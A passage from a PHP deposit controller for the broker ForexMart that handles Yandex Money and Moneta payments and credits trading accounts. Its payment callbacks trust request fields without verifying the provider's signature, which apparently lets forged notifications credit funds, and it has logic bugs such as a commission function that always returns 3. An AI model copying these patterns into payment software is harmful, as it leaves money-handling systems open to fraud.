//        }else{
//            $WebService->open_Deposit_30PercentBonus($account_info);
//            $reqResult   = $WebService->request_status;
////            $bonusTicket = $WebService->get_result('Ticket');
//        }

        if ($reqResult === 'RET_OK') {
            $WebService2 = new WebService($webservice_config);
            $WebService2->request_live_account_balance($account_number);
            if ($WebService2->request_status === 'RET_OK') {
                $amount = $WebService2->get_result('Balance');
                $this->account_model->updateAmountByAccountNumber($account_number, $amount);

                return true;
            }
        }

        return false;
    }

    public function checkPaymentHistory($transaction_type, $transaction_id, $user_id, $logData)
    {
//    $transaction_type = preg_replace('/\s+/', '', $transaction_type);   $transaction_type= trim($transaction_type);
//    $transaction_id = preg_replace('/\s+/', '', $transaction_id);   $transaction_id= trim($transaction_id);
//    $user_id = preg_replace('/\s+/', '', $user_id);   $user_id= trim($user_id);
//
        $data = $this->general_model->getQueryOneObject('deposit', '*', ['transaction_id' => $transaction_id, 'transaction_type' => $transaction_type]);
        // log validation of sofort

        if ($data) {
            return 'alreadyExists';
        } else {
            $dataLog = $this->general_model->getQueryOneObject($logData['table'], '*', [$logData['transection_id_column_name'] => $transaction_id, 'status' => 0]);
            //  echo $this->db->last_query();
            if ($dataLog) {
                return 'empty';
            } else {
                return 'alreadyExists';
            }
        }
    }

    public function transactionMessage($data, $option = '')
    {
        //      $data['user_id']    $data['raw_amount'] $data['transaction_id']
        $starData = 'users.id,users.email,users.nodepositbonus,mta.mt_currency_base';
        $whrData = ['users.id' => $data['user_id'], 'users.nodepositbonus' => 1];
        $joindata = ['mt_accounts_set mta__inner' => 'users.id=mta.user_id'];
        $mgsResult = $this->general_model->getQueryOneObject('users', $starData, $whrData, $joindata);

        if ($option) {
            if ($mgsResult) {
                return 'Please be informed that upon successful deposit, NDB will be automatically cancelled.';
            } else {
                if ($data['transaction_id'] == '') {
                    return 'You have successfully deposited.';
                } else {
                    return 'You have successfully deposited '.$data['raw_amount'].' '.$mgsResult->mt_currency_base.'. You transaction id is '.$data['transaction_id'];
                }
            }
        } else {
            if ($mgsResult) {
                $this->session->set_flashdata('msg_transaction', 'Please be informed that upon successful deposit, NDB will be automatically cancelled.');
            } else {
                if ($data['transaction_id'] == '') {
                    $this->session->set_flashdata('msg_transaction', 'You have successfully deposited');
                } else {
                    $this->session->set_flashdata('msg_transaction', 'You have successfully deposited '.$data['raw_amount'].' '.$mgsResult->mt_currency_base.'. You transaction id is '.$data['transaction_id']);
                }
            }

            return true;
        }
    }

    public function yandexCheckNotification()
    {
        // checkorder response
        $response = $this->checkOrder($_REQUEST);
        $this->sendResponse($response);
    }

    public function yandexNotification()
    {
        // payment  paymentAviso
        $explodeNumberAmount = explode('_', $_REQUEST['customerNumber']);   // it's explode cause user depost usd amoun and user id combind customernNumber userid_amount
        $rawDeposit = $explodeNumberAmount[1];
        $customerNumber = $explodeNumberAmount[0];
        $bonusCheck = $explodeNumberAmount[2];
        $bonusType = $explodeNumberAmount[3];

        $checkDepo = [
            'customerNumber' => $customerNumber,
            'invoiceId' => $_REQUEST['invoiceId'],
            'paymentType' => $_REQUEST['paymentType'],
            'shopId' => $_REQUEST['shopId'],
        ];

        $checkDepostiRe = $this->general_model->getQueryStirngRow('yandex_money', '*', $checkDepo);
        if (empty($checkDepostiRe)) {
            $accData = FXPP::getAllACcount($customerNumber);
            $currenccySet = $accData->currency;

            $ammount = $_REQUEST['shopSumAmount'];

            /* FXPP-6333 */
            $currencyStatus = $this->currency_status[$currenccySet];
            $isMicro = $this->account_model->isMicro($customerNumber);
            if ($isMicro) {
                $ammount *= 100;
                $rawDeposit *= 100;
                $currencyStatus = $this->currency_status['Cents'];
            }
            /* FXPP-6333 */

            $convertAmount = $this->get_convert_amount('RUB', $ammount, $currenccySet); // user mt account base currency

            $convertAmountUSD = $this->get_convert_amount('RUB', $ammount, 'USD'); // default currency USD

            $rawConvertAmount = $rawDeposit; //$this->get_convert_amount('USD', $rawDeposit,$currenccySet);  // user input usd doller but  getting user mt account currecny and mt account currency wise raw usd amount convert.

            $rawConvertAmount = (float) $rawConvertAmount;
            $convertAmount = (float) $convertAmount;
            $fees = ($rawConvertAmount - $convertAmount);

            $y_data = [
                'shopSumCurrencyPaycash' => $_REQUEST['shopSumCurrencyPaycash'],
                'orderSumBankPaycash' => $_REQUEST['orderSumBankPaycash'],
                'cps_region_id' => $_REQUEST['cps_region_id'],
                'merchant_order_id' => $_REQUEST['merchant_order_id'],
                'paymentPayerCode' => $_REQUEST['paymentPayerCode'],
                'customerNumber' => $customerNumber,
                'paymentType' => $_REQUEST['paymentType'],
                'requestDatetime' => $_REQUEST['requestDatetime'],
                'cps_user_country_code' => $_REQUEST['cps_user_country_code'],
                'orderCreatedDatetime' => $_REQUEST['orderCreatedDatetime'],
                'invoiceId' => $_REQUEST['invoiceId'],
                'shopId' => $_REQUEST['shopId'],
                'scid' => $_REQUEST['scid'],
                'shopSumBankPaycash' => $_REQUEST['shopSumBankPaycash'],
                'shopSumAmount' => $_REQUEST['shopSumAmount'],
                'deposit_amount' => $convertAmount,
                'account_number' => $accData->account_number,
                'fees' => $fees,
                'user_currency' => $currenccySet,
                'raw_deposit' => $rawConvertAmount,
                'raw_deposit_usd' => $convertAmountUSD,
                'bonusType' => ($bonusCheck == 1) ? $bonusType : 0,
            ];

            $alreadyInCheck = $this->general_model->getQueryStirngRow('yandex_money', '*', ['invoiceId' => $_REQUEST['invoiceId']]);
            if (!$alreadyInCheck) {
                $this->general_model->insert('yandex_money', $y_data);
            }

            // api mt account send and deposit store
            $data = [
                'transaction_id' => $_REQUEST['invoiceId'],
                'reference_id' => 0,
                'status' => 2,
                'currency' => $currenccySet,
                'amount' => $convertAmount, // user currency base deposit total amount
                'conv_amount' => $convertAmountUSD,  // Default amount USD
                'user_id' => $customerNumber,
                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                'note' => 'Yandex DEPOSIT',
                'transaction_type' => 'yandexMoney',
                'payment_status' => $this->paymentType_status['Deposit via YandexMoney'], //FXPP-7618
                'currency_status' => $currencyStatus, //FXPP-7618
            ];

            $bonusArray = [];
            if ($bonusCheck == 1) {
                $bonusArray = [
                    'user_id' => $customerNumber,
                    'account_number' => $accData->account_number,
                    'amount' => $rawConvertAmount,
                    'note' => 'YandexMoney',
                    'bonusType' => $bonusType,
                ];
            }

            $logData = ['table' => 'yandex_money', 'transection_id_column_name' => 'invoiceId'];
            $abcCheck = $this->checkPaymentHistory('yandexMoney', $_REQUEST['invoiceId'], $customerNumber, $logData);
            if ($abcCheck == 'empty') {
                $this->session->set_userdata('session_sofort_done', 'done');
                $this->general_model->update('yandex_money', 'invoiceId', $_REQUEST['invoiceId'], ['status' => 1]);

                $result_of_deposit = $this->updateLiveBlanceYandex($data, $accData->account_number, $convertAmount, 'DPST_YM_'.$_REQUEST['invoiceId']);

                // Bonus Profit Cancellation**/
                $bonuses = FXPP::getAccountBonusByType($accData->account_number);
                $yandex_amount = $rawConvertAmount;
                $RequestLogintype = $this->account_model->getAccountLoginType($customerNumber);
                if ($RequestLogintype['login_type'] != 1) {
                    if ($yandex_amount > 0 and $bonuses[2] > 0) {
                        FXPP::BonusProfitCancellation($customerNumber, $accData->account_number, $yandex_amount, $_REQUEST['invoiceId']);
                    }
                }

                // Bonus Profit Logs**/
                $ndbProfitLogs = [
                    'Account_number' => $accData->account_number,
                    'DepAmount' => $yandex_amount,
                    'UserId' => $customerNumber,
                    'TransactionId' => $_REQUEST['invoiceId'],
                    'ndbbonus' => $bonuses[2],
                ];
                $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                $insertProfitLogs = [
                    'logs' => $encodeNdbProfitLogs,
                    'User_Id' => $customerNumber,
                ];

                $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

                unset($data['amount']);
                unset($data['conv_amount']);
                $convertFeesAmountUSD = $this->get_convert_amount($currenccySet, $fees, 'USD'); // default currency USD convert

                $data['amount'] = $fees; // user currency base deposit fee amount
                $data['conv_amount'] = $convertFeesAmountUSD; // Default fee amount USD

                if ($result_of_deposit) {
                    $this->updateLiveBlanceYandex($data, $accData->account_number, $fees, 'FEES_YM_'.$_REQUEST['invoiceId'], $bonusArray);

                    // xlm send
                    $response = $this->paymentAviso($_REQUEST);
                    $this->sendResponse($response);

                    $amountOFreport = floatval($convertAmountUSD) + floatval($convertFeesAmountUSD);

                    /**  Use original amount to Cent accounts for  auto-reports**/
                    $isMicro = $this->account_model->isMicro($customerNumber);
                    if ($isMicro) {
                        $amountOFreport /= 100;
                    }
                    /** End **/

                    /** Send successful email deposit to auto-reports **/
                    $commentOFreport = 'DPST_YM_'.$_REQUEST['invoiceId'];
                    $this->sendEmailAfterSuccessDeposit('YANDEXMONEY', $amountOFreport, $accData->account_number, $customerNumber, $commentOFreport);
                    /* End **/
                }
            }
        } else {
            /*if (isset($_REQUEST['code'])) {
                if ($_REQUEST['code'] == 1 || $_REQUEST['code'] == 200) {
                    $code = $_REQUEST['code'];
                    $stat = array(
                        1   =>  'Authorization error',
                        200 =>  'Request parsing error'
                    );
                    $email_details['reason'] = $_REQUEST['code'];
                }
            } else {
                $stat = 'Invoice already exist';
                $email_details['reason'] = $stat;
            }

            $account_detail = $this->account_model->getAccountByUserId($customerNumber);
            $email_details['type'] = 'Yandex';
            $email_details['account_number'] = $account_detail['account_number'];
            $this->sendEmailFailedDeposit($email_details);*/
        }
    }

    public function updateLiveBlanceYandex($data, $account_number, $mtAmount, $mtComments, $bonusArray = [])
    {
        $insertDepositFailed = [
            'transaction_id	' => $data['transaction_id'],
            'status	' => 0,
            'amount	' => $data['amount'],
            'currency' => $data['currency'],
            'user_id' => $data['user_id'],
            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
            'transaction_type' => 'YANDEXMONEY',
            'payment_status' => $data['payment_status'],
            'currency_status' => $data['currency_status'],
            'fee' => ($bonusArray['bonusType'] == '') ? 0 : $mtAmount,
            'isFailed' => 0,
            'type' => 'deposit-'.$bonusArray['bonusType'],
        ];

        $config = [
            'server' => 'live_new',
        ];

//        $WebService = new WebService($config);

//        if (IPLoc::APIUpgradeDevIP()) {
            $WebServiceNew = FXPP::DepositRealFund($account_number, $mtAmount, $mtComments);
            $requestResult = $WebServiceNew['requestResult'];
            $ticket = $WebServiceNew['ticket'];
//        } else {
//            $WebService->update_live_deposit_balance($account_number, $mtAmount, $mtComments);
//            $requestResult = $WebService->request_status;
//            $ticket = $WebService->get_result('Ticket');
//        }

        $resultdone = false;

        if ($requestResult === 'RET_OK') {
            $data['mt_ticket'] = $ticket;

            // Back Agent of Client
           // FXPP::BackAgentOfAccount($account_number);

            $WebService2 = new WebService($config);
            $WebService2->request_live_account_balance($account_number);

            if ($WebService2->request_status === 'RET_OK') {
                $balance = $WebService2->get_result('Balance');
                $this->account_model->updateAccountBalance($account_number, $balance);
            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
            } else {
                $insertDepositFailed['comment'] = $WebService2->request_status;
                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
            }

            $this->SetAccountAgentPotentialFund($account_number);
            $last_deposit_id = $this->deposit_model->insertPayment($data);
            $resultdone = true;
        } else {
            $insertDepositFailed['comment'] = $requestResult;
            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
        }
//          FXPP::updateAccountTradingStatus($bonusArray['account_number'],$bonusArray['user_id']); // for pro accounts

        /* if(IPLoc::APIUpgradeDevIP()){
             FXPP::updateAccountTradingStatusV2($bonusArray['account_number'],$bonusArray['user_id']); // for pro accounts
         }else{*/
        FXPP::updateAccountTradingStatus($bonusArray['account_number'], $bonusArray['user_id']); // for pro accounts
        // }

        if (!empty($bonusArray)) {
//            if ($bonusArray['bonusType'] == 'rhpb') {
//                FXPP::DepositRegular100PercentBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], 'rhpb', $data['transaction_id'], $maxNumofDeposit = 2);
//            } elseif ($bonusArray['bonusType'] == 'hpb') {
//                FXPP::Deposit100PercentBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], 'hplb', $data['transaction_id']);
//            } else {
//                FXPP::DepositBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], $bonusArray['bonusType'], $data['transaction_id']);
//            }
            self::applyDepositBonus(
                $bonusArray['user_id'],
                $bonusArray['account_number'],
                $bonusArray['amount'],
                $bonusArray['note'],
                $bonusArray['bonusType'],
                $data['transaction_id'],
                false
            );
        }

        return $resultdone;
    }

    public function yandexCancelled()
    {
        $this->session->set_flashdata('d_ydx_status', 1);
        redirect(FXPP::loc_url('deposit/yandex'));
    }

    public function yandex()
    {
        if ($this->session->userdata('logged')) {
            redirect(FXPP::loc_url('deposit')); //FXPP-9351

//           it's allow client and partner
//            FXPP::LoginTypeRestriction();
//            $userAccountCurrencyBase = FXPP::getCustomUserAccountCurrencyBase();

            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->post('bounusfiled', true);

            // if ($data['amount'] == null) {
            $this->form_validation->set_rules('paymentType', 'Payment Type', 'trim|required|xss_clean');
            $this->form_validation->set_rules('sum', ' Deposit Amount', 'trim|required|xss_clean');
            // }

            $error = '';
            $message = '';
            $field = '';
            $showModalOnLoad = false;
            $details = '';
            $showForm = 'nt-tab1';
            $data['amountmgs'] = '';

            $currentUser = $this->session->userdata('user_id');
            $accData = FXPP::getAllACcount($currentUser);
            $data['client_currency'] = $accData->currency;
            if ($data['client_currency'] == 'RUB') {
                $data['client_currency'] = 'RUR';
            }
            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                // if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                $currenccySet = $accData->currency;
                $stadartUSDAmount = $this->get_convert_amount('RUB', 100, $currenccySet);

                $ammount = $this->input->post('sum', true);

                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($currentUser);
                if ($isMicro) {
                    $ammount /= 100;
                }
                 FXPP-6333 */
                $rubAmount = $this->get_convert_amount($currenccySet, $ammount, 'RUB');
                $rubAmount = str_replace(',', '', $rubAmount);
                $rubAmount = (float) $rubAmount;
                $USDamount = $this->get_convert_amount('RUB', $rubAmount, 'USD');
                $cheCkAmount = floor($rubAmount * 100) / 100;
                $item_details = 'ForexMart Deposit (Yandex - ['.$accData->account_number.'])';

                if ($cheCkAmount >= 100) {
                    $data = [
                            'customerNumber' => $this->session->userdata('user_id').'_'.$ammount.'_'.$this->input->post('bounusfiled', true).'_'.$_GET['bonus'],
                            'sum' => $rubAmount,
                            'paymentType' => $this->input->post('paymentType', true),
                            'shopId' => 113155, /* 113155 151 */
                            'scid' => 49341, // 49341, /* 531263  363 7173 */
                            'shn' => $item_details,
                            'cancel_url' => site_url().'deposit/yandexCancelled',
                        ];
                    FXPP::isEUPayment('deposit/yandex');

                    $this->load->view('deposits/yandexMoney_payments', $data);
                } else {
                    $minAmount = ceil($stadartUSDAmount * 100) / 100;

                    $data['amountmgs'] = 'Minimum deposit is at least '.$minAmount.' '.$currenccySet;

                    $js = $this->template->Js();

                    $this->template->title('ForexMart | Deposit - YandexMoney')
                            ->set_layout('internal/main')
                            ->build('deposits/yandexMoney', $data);
                }
                // }
            } else {
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $js = $this->template->Js();

                $display = $this->session->flashdata('d_mnt_status');
                if (isset($display)) {
                    $accData = FXPP::getAllACcount($this->session->userdata('user_id'));
                    $stat_msg = [
                        0 => 'FAILED',
                        1 => 'CANCELLED',
                    ];
                    $email_details = [
                        'account_number' => $accData->account_number,
                        'type' => 'Yandex',
                        'reason' => $stat_msg[$display],
                    ];
                    $this->sendEmailFailedDeposit($email_details);
                }

                $this->template->title('ForexMart | Deposit - YandexMoney')
                    ->set_layout('internal/main')
                    ->build('deposits/yandexMoney', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function moneta($result = null)
    {
        if ($this->session->userdata('logged')) {
            if (FXPP::isEUClient()) {
                redirect('deposit');
            }
//           it's allow client and partner
//            FXPP::LoginTypeRestriction();
//            $userAccountCurrencyBase = FXPP::getCustomUserAccountCurrencyBase();
            $account_detail = $this->general_model->whereConditionQuery($this->session->userdata('user_id'));
            // $getaccount = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
            $currency_conv = $account_detail['currency'];
            $acc_number = $account_detail['account_number'];
            $data['amount'] = $this->input->post_get('amount1', true);
            $data['bounusfiled'] = $this->input->post('bounusfiled', true);
            // if ($data['amount'] == null) {
            // $this->form_validation->set_rules('sum', ' Deposit Amount', 'trim|required|xss_clean');
            $this->form_validation->set_rules('sum', ' Deposit Amount', "trim|required|deposit_moneta_amt_validation[$currency_conv]");
            // }

            $error = '';
            $message = '';
            $field = '';
            $showModalOnLoad = false;
            $details = '';
            $showForm = 'nt-tab1';
            $data['amountmgs'] = '';

            $currentUser = $this->session->userdata('user_id');
            $accData = FXPP::getAllACcount($currentUser);
            $data['client_currency'] = $accData->currency;
            if ($data['client_currency'] == 'RUB') {
                $data['client_currency'] = 'RUR';
            }

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                //if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960
                $currenccySet = $accData->currency;
                // if(IPLoc::Office()) {
                /* $accountType = FXPP::fmGroupType($accData->account_number);
                 switch ($accountType) {
                     case 'ForexMart Classic':
                     case 'ForexMart Cents':
                         $minAmount = 15; //usd
                         $minAmount = $this->get_convert_amount('USD', $minAmount, 'RUB');
                        // $minAmount = ceil($convAmountRUB * 100) / 100;
                         break;
                     case 'ForexMart Pro':
                         $minAmount = 200; //usd
                         $minAmount = $this->get_convert_amount('USD', $minAmount, 'RUB');
                        // $minAmountRUB = ceil($convAmountRUB * 100) / 100;
                         break;
                     default:
                         $minAmount = 100; //100 RUB
                         break;

                 }*/
//                    }else{
                      $minAmount = 100; //100 RUB
//                    }
                    $stadartUSDAmount = $this->get_convert_amount('RUB', $minAmount, $currenccySet);

                $ammount = $this->input->post('sum', true);

                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($currentUser);
                if ($isMicro) {
                $ammount /= 100;
                }
                 FXPP-6333 */

                $rubAmount = $this->get_convert_amount($currenccySet, $ammount, 'RUB');
                $rubAmount = str_replace(',', '', $rubAmount);
                $rubAmount = (float) $rubAmount;

                $USDamount = $this->get_convert_amount('RUB', $rubAmount, 'USD');
                $cheCkAmount = floor($rubAmount * 100) / 100;

                if ($cheCkAmount >= $minAmount) {
                    $data = [
                            'MNT_CUSTOM1' => $this->session->userdata('user_id').'_'.$this->input->post('bounusfiled', true).'_'.$_GET['bonus'],
                            'MNT_CUSTOM2' => $ammount,
                            'MNT_AMOUNT' => $rubAmount,
                            'MNT_ID' => 74293318,
                            'MNT_TRANSACTION_ID' => uniqid(),
                            'MNT_SUCCESS_URL' => site_url().'deposit/monetaSuccess',
                            'MNT_FAIL_URL' => site_url().'deposit/moneta',
                            'MNT_RETURN_URL' => site_url().'deposit/monetaCancel',
                        ];

                    FXPP::failedPaymentNotify('moneta'); //FXPP-9628

                    FXPP::isEUPayment('deposit/moneta');
                    $this->load->view('deposits/moneta_payments', $data);
                } else {
                    $minAmount = ceil($stadartUSDAmount * 100) / 100;

                    $data['amountmgs'] = 'Minimum deposit is at least '.$minAmount.' '.$currenccySet;

                    $js = $this->template->Js();

                    $this->template->title('ForexMart | Deposit - Moneta')
                            ->set_layout('internal/main')
                            ->build('deposits/moneta', $data);
                }

                //}
            } else {
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $eu_payment_result = $this->euPaymentStatus($this->session->userdata('user_id'), 'moneta'); //FXPP-9628
                $data['eu_payment_status'] = $eu_payment_result['error'];
                $data['eu_error_message'] = $eu_payment_result['error_msg'];

                $data['success'] = $result;
                $js = $this->template->Js();
                $display = $this->session->flashdata('d_mnt_status');
                if (isset($display)) {
                    $accData = FXPP::getAllACcount($this->session->userdata('user_id'));
                    $stat_msg = [
                        0 => 'FAILED',
                        1 => 'CANCELLED',
                    ];
                    $email_details = [
                        'account_number' => $accData->account_number,
                        'type' => 'Moneta',
                        'reason' => $stat_msg[$display],
                    ];
                    $this->sendEmailFailedDeposit($email_details);
                }
                $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id')); //joy deposit FXPP-6768
                $this->template->title('ForexMart | Deposit - Moneta')
                    ->set_layout('internal/main')
                    ->build('deposits/moneta', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function monetaCancel()
    {
        $this->session->set_flashdata('d_mnt_status', 1);
        $this->euRedirect();
        redirect(FXPP::loc_url('deposit/moneta'));
    }

    public function monetaFailed()
    {
        $this->session->set_flashdata('d_mnt_status', 0);
        FXPP::failedPaymentNotify('moneta', 1, $this->session->userdata('user_id'), 'Transaction Failed.'); //FXPP-9628
        $this->euRedirect();
        redirect(FXPP::loc_url('deposit/moneta'));
    }

    public function monetaSuccess()
    {
        $moentaData = $this->general_model->showssingle('moneta', 'MNT_TRANSACTION_ID', $_REQUEST['MNT_TRANSACTION_ID'], '*');

        $accData = $this->general_model->showssingle('mt_accounts_set', 'user_id', $moentaData['user_id'], '*');
        $GetCurrency = $accData['mt_currency_base'];

        $this->session->set_flashdata('moneta_transaction', 'You have successfully deposited '.$moentaData['raw_amount'].' '.$GetCurrency.'. You transaction id is '.$_REQUEST['MNT_TRANSACTION_ID']);
        $this->euRedirect();
        redirect(FXPP::loc_url('deposit/moneta'));
    }

    public function monetaNotification()
    {
        // Code of data integrity verification
        $this->euRedirect();
    }

    public function getMonetaPymentType($comments, $transaction_id)
    {
        //DPST_MON_transaction_id
        $comm = 'DPST_MON_'.$transaction_id;
        switch ($comments) {
            case '822360':
                $comm = 'DPST_MON_QW_'.$transaction_id;   //QIWI Wallet
                break;
            case '510801':
                $comm = 'DPST_MON_SB_'.$transaction_id;   //Sberbank
                break;
            case '587412':
                $comm = 'DPST_MON_AC_'.$transaction_id;    //Internet-bank "Alfa-Click"
                break;
            case '661709':
                $comm = 'DPST_MON_PB_'.$transaction_id;   //Internet-bank "Promsvyazbank"
                break;
            case '1029':
                $comm = 'DPST_MON_RUB_'.$transaction_id;   //Russian Post centres
                break;
            case '705000':
                $comm = 'DPST_MON_BT_'.$transaction_id;   //bank transfer
                break;
            default:
                $comm = 'DPST_MON_'.$transaction_id;     //Moneta.ru
        }

        return $comm;
    }

    public function getMonetaPymentTypeFees($comments, $transaction_id)
    {
        //FEES_MON_transaction_id
        $comm = 'FEES_MON_'.$transaction_id;
        switch ($comments) {
            case '822360':
                $comm = 'FEES_MON_QW_'.$transaction_id;   //QIWI Wallet
                break;
            case '510801':
                $comm = 'FEES_MON_SB_'.$transaction_id;   //Sberbank
                break;
            case '587412':
                $comm = 'FEES_MON_AC_'.$transaction_id;    //Internet-bank "Alfa-Click"
                break;
            case '661709':
                $comm = 'FEES_MON_PB_'.$transaction_id;   //Internet-bank "Promsvyazbank"
                break;
            case '1029':
                $comm = 'FEES_MON_RUB_'.$transaction_id;   //Russian Post centres
                break;
            case '705000':
                $comm = 'FEES_MON_BT_'.$transaction_id;   //bank transfer
                break;
            default:
                $comm = 'FEES_MON_'.$transaction_id;     //Moneta.ru
        }

        return $comm;
    }

    public function getMonetaPymentTypeCommission($accountType)
    {
        switch ($accountType) {
            case '822360':
                $comm = 7; //QIWI Wallet
                break;
            case '510801':
                $comm = 3.5;  //Sberbank
                break;
            case '587412':
                $comm = 3.5;    //Internet-bank "Alfa-Click"
                break;
            case '661709':
                $comm = 3.5;   //Internet-bank "Promsvyazbank"
                break;
            case '1029':
                $comm = 3; //Russian Post centres
                break;
            case '705000':
                $comm = 3;   //bank transfer
                break;
            default:
                $comm = 3;     //Moneta.ru
        }

        return $comm = 3;
    }

    public function monetaPay()
    {
        $userPercent = explode('_', $_REQUEST['MNT_CUSTOM1']);
        $user_id = $userPercent[0];
        $bonusCheck = $userPercent[1];
        $bonusType = $userPercent[2];

        $performedDatetime = date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime()));

        /* FXPP-6333 */
        $isMicro = $this->account_model->isMicro($user_id);
        if ($isMicro) {
            $_REQUEST['MNT_AMOUNT'] *= 100;
            $_REQUEST['MNT_CUSTOM2'] *= 100;
        }
        /* FXPP-6333 */

        $convertAmountUSD = $this->get_convert_amount($_REQUEST['MNT_CURRENCY_CODE'], $_REQUEST['MNT_AMOUNT'], 'USD');
        $data = [
            'MNT_ID' => $_REQUEST['MNT_ID'],
            'MNT_TRANSACTION_ID' => $_REQUEST['MNT_TRANSACTION_ID'],
            'MNT_OPERATION_ID' => $_REQUEST['MNT_OPERATION_ID'],
            'MNT_AMOUNT' => $_REQUEST['MNT_AMOUNT'],
            'MNT_CURRENCY_CODE' => $_REQUEST['MNT_CURRENCY_CODE'],
            'MNT_TEST_MODE' => $_REQUEST['MNT_TEST_MODE'],
            'MNT_SIGNATURE' => $_REQUEST['MNT_SIGNATURE'],
            'MNT_USER' => $_REQUEST['MNT_USER'],
            'MNT_CORRACCOUNT' => $_REQUEST['MNT_CORRACCOUNT'],
            'user_id' => $user_id,
            'raw_amount' => $_REQUEST['MNT_CUSTOM2'],
            'deposit_usd_amount' => $convertAmountUSD,
            'created_date' => $performedDatetime,
            'bonusType' => ($bonusCheck == 1) ? $bonusType : 0,
        ];

        $alreadyInCheck = $this->general_model->getQueryStirngRow('moneta', '*', ['MNT_TRANSACTION_ID' => $_REQUEST['MNT_TRANSACTION_ID']]);
        if (!$alreadyInCheck) {
            $this->general_model->insert('moneta', $data);
        }

        $currentUser = $user_id;
        $accData = FXPP::getAllACcount($currentUser);
        $currenccySet = $accData->currency;
        $convertAmount = $this->get_convert_amount($_REQUEST['MNT_CURRENCY_CODE'], $_REQUEST['MNT_AMOUNT'], $currenccySet);

        // get amount and fee
        $convertAmount;
        $convertAmountUSD;
        $commissionPer = $this->getMonetaPymentTypeCommission($_REQUEST['paymentSystem_unitId']); // get rub currency percentange commission [3%]
        $rubCommissionAmount = ($_REQUEST['MNT_AMOUNT'] * $commissionPer) / 100;
        $feeConAmount = $this->get_convert_amount($_REQUEST['MNT_CURRENCY_CODE'], $rubCommissionAmount, $currenccySet);
        $depositConvertAmount = $convertAmount - $feeConAmount;

        $currencyStatus = $this->currency_status[$currenccySet];
        $isMicro = $this->account_model->isMicro($user_id);
        if ($isMicro) {
            $currencyStatus = $this->currency_status['Cents'];
        }

        $feeConAmountUSD = $this->get_convert_amount($_REQUEST['MNT_CURRENCY_CODE'], $rubCommissionAmount, 'USD');

        $depositConvertAmountUSD = $convertAmountUSD - $feeConAmountUSD;

        /* get amount and fee close */

        $Depodata = [
            'transaction_id' => $_REQUEST['MNT_TRANSACTION_ID'],
            'reference_id' => 0,
            'status' => 2, // 1= demo 2= real
            'currency' => $currenccySet,
            'amount' => $depositConvertAmount, // user currency base deposit total amount
            'conv_amount' => $depositConvertAmountUSD,  // Default amount USD
            'user_id' => $user_id,
            'payment_date' => $performedDatetime,
            'note' => 'MONETA DEPOSIT',
            'transaction_type' => 'MONETA',
            'payment_status' => $this->paymentType_status['Deposit via Moneta'], //FXPP-7618
            'currency_status' => $currencyStatus, //FXPP-7618
        ];

        $bonusArray = [];
        if ($bonusCheck == '1') {
            $bonusArray = [
                'user_id' => $user_id,
                'account_number' => $accData->account_number,
                'amount' => $_REQUEST['MNT_CUSTOM2'],
                'note' => 'MONETA',
                'bonusType' => $bonusType,
            ];
        }

        $logData = ['table' => 'moneta', 'transection_id_column_name' => 'MNT_TRANSACTION_ID'];
        $abcCheck = $this->checkPaymentHistory('MONETA', $_REQUEST['MNT_TRANSACTION_ID'], $user_id, $logData);
        if ($abcCheck == 'empty') {
            $this->general_model->update('moneta', 'MNT_TRANSACTION_ID', $_REQUEST['MNT_TRANSACTION_ID'], ['status' => 1]);

            $mtComments = $this->getMonetaPymentType($_REQUEST['paymentSystem_unitId'], $_REQUEST['MNT_TRANSACTION_ID']);
            $result_of_deposit = $this->updateLiveBlanceMoneta($Depodata, $accData->account_number, $depositConvertAmount, $mtComments);

            // Bonus Profit Cancellation**/
